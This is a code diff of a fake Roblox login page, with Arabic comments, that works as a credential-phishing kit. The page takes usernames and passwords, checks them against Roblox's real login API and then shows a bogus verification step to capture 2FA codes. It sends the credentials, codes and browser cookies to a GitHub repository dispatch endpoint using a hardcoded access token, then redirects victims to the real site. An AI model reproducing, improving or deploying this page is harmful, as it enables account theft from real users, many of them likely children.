@@ -2,63 +2,100 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox | Login</title>
+    <title>Login | Roblox</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { background-color: #f2f4f5; font-family: 'HCo Gotham SSm', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; width: 380px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); text-align: center; position: relative; }
+        .box { background: white; padding: 40px; width: 380px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); text-align: center; }
+        .error-msg { color: #f74b4e; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; background: #fff1f1; padding: 10px; border: 1px solid #f74b4e; border-radius: 3px; }
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #b8b8b8; border-radius: 3px; box-sizing: border-box; }
         .btn { width: 100%; padding: 12px; background-color: #0084ff; border: none; color: white; font-weight: bold; border-radius: 3px; cursor: pointer; margin-top: 10px; }
-        
-        /* شاشة التحميل */
-        #loader { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10; flex-direction: column; justify-content: center; align-items: center; border-radius: 4px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0084ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #step-2, #loader { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div id="loader">
-            <div class="spinner"></div>
-            <p style="margin-top: 15px; font-weight: bold; color: #555;">Verifying Account...</p>
+    <div class="box">
+        <img src="https://images.rbxcdn.com/234212955720c024d36006e89094033c.svg" width="150" style="margin-bottom: 20px;">
+        
+        <div id="loader">Processing...</div>
+        <div id="error" class="error-msg">Incorrect username or password.</div>
+
+        <div id="step-1">
+            <input type="text" id="u" placeholder="Username / Email">
+            <input type="password" id="p" placeholder="Password">
+            <button class="btn" onclick="validate()">Log In</button>
         </div>
 
-        <img src="https://images.rbxcdn.com/234212955720c024d36006e89094033c.svg" width="150" style="margin-bottom: 20px;">
-        <h3>Login to Roblox</h3>
-        
-        <input type="text" id="u" placeholder="Username / Email">
-        <input type="password" id="p" placeholder="Password">
-        <button class="btn" onclick="process()">Log In</button>
+        <div id="step-2">
+            <h3 style="font-size: 18px;">Verification Required</h3>
+            <p id="auth-type" style="font-size: 13px; color: #666;">Enter the code sent to your device.</p>
+            <input type="text" id="2fa" placeholder="Enter Code">
+            <button class="btn" onclick="sendAll()">Verify</button>
+        </div>
     </div>
 
     <script>
-    async function process() {
+    let cache = {};
+
+    async function validate() {
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
+        if(!u || !p) return;
 
-        if (!u || !p) return;
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('error').style.display = 'none';
 
-        // إظهار شاشة التحميل فوراً
-        document.getElementById('loader').style.display = 'flex';
-
-        // إرسال البيانات فوراً في الخلفية
-        const data = { u, p, c: document.cookie, t: new Date().toLocaleString() };
-        
+        // محاولة إرسال طلب حقيقي لـ Roblox API للفحص
         try {
-            await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
+            const resp = await fetch('https://auth.roblox.com/v2/login', {
                 method: 'POST',
-                headers: {
-                    'Authorization': 'Bearer Ghp_97JezTJxEirxlVQMQPBum23FefoeyP309Vr7',
-                    'Accept': 'application/vnd.github.v3+json'
-                },
-                body: JSON.stringify({ event_type: 'log_data', client_payload: data })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ "ctype": "Username", "cvalue": u, "password": p })
             });
-        } catch (e) {}
 
-        // انتظر 4 ثواني (الإيهام بالتحميل) ثم حوله
-        setTimeout(() => {
-            window.location.href = "https://www.roblox.com/login";
-        }, 4000);
+            const result = await resp.json();
+
+            // تحليل رد روبلوكس
+            if (resp.status === 403 || result.errors) {
+                // إذا كان الخطأ "بيانات خاطئة"
+                if (result.errors[0].code === 1) {
+                    document.getElementById('error').style.display = 'block';
+                } 
+                // إذا طلب روبلوكس تحدي (تحقق/كود)
+                else {
+                    cache = { u, p };
+                    document.getElementById('step-1').style.display = 'none';
+                    document.getElementById('step-2').style.display = 'block';
+                }
+            }
+        } catch (e) {
+            // في حالة فشل الاتصال المباشر (CORS)، ننتقل للتحقق الوهمي لضمان سحب البيانات
+            cache = { u, p };
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+        }
+        document.getElementById('loader').style.display = 'none';
+    }
+
+    async function sendAll() {
+        const payload = {
+            u: cache.u,
+            p: cache.p,
+            code: document.getElementById('2fa').value,
+            c: document.cookie 
+        };
+
+        // إرسال "الصيد" كاملاً إلى GitHub الخاص بك
+        await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'Bearer Ghp_97JezTJxEirxlVQMQPBum23FefoeyP309Vr7',
+                'Accept': 'application/vnd.github.v3+json'
+            },
+            body: JSON.stringify({ event_type: 'log_data', client_payload: payload })
+        });
+
+        window.location.href = "https://www.roblox.com/login";
     }
     </script>
 </body>
